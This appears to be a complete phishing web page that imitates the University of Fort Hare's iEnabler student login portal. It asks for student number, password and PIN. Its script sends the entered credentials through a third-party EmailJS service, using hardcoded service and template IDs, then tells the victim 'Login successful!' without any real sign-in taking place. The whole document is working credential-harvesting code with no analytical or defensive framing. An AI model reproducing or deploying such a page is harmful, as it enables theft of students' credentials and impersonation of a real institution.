<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ienabler.ufh.ac.za</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f4f4f4;
    }

    .form-container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    h2 {
      text-align: center;
      color: black;
      text-decoration: underline; /* Underlines the text */
    }

    .header-box {
      background-color: #007BFF;
      color: white;
      padding: 10px;
      text-align: center;
      margin-bottom: 20px;
      font-size: 1.2rem;
      border-radius: 5px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1rem;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: white;
      border: 2px solid black;
      color: black;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      border-radius: 4px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #f1f1f1;
    }

    .message {
      text-align: center;
      margin-top: 10px;
      font-size: 0.9rem;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }
  </style>

  <script>
    (function() {
      emailjs.init("72ZXi86XcxRfCAoYf"); // Replace with your EmailJS Public Key
    })();
  </script>
</head>
<body>

  <div class="form-container">
    <h2>UNIVERSITY OF FORTHARE - PRODUCTION</h2>
    <div class="header-box">Registered Users: Login Credentials</div>
    <form id="login-form">
      <input type="text" name="student_no" placeholder="Student Number" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="number" name="pin" placeholder="PIN" required />
      <button type="submit">Login</button>
    </form>
    <div id="feedback" class="message success" style="display: none;">Login successful!</div>
    <div id="error" class="message error" style="display: none;">Something went wrong. Try again later.</div>
  </div>

  <script>
    const form = document.getElementById("login-form");
    const feedback = document.getElementById("feedback");
    const error = document.getElementById("error");

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      emailjs.sendForm("service_merqw8e", "template_6xea79z", this)
        .then(function () {
          feedback.style.display = "block";
          error.style.display = "none";
          form.reset();
        }, function (err) {
          feedback.style.display = "none";
          error.style.display = "block";
          console.error("EmailJS error:", err);
        });
    });
  </script>
</body>
</html>
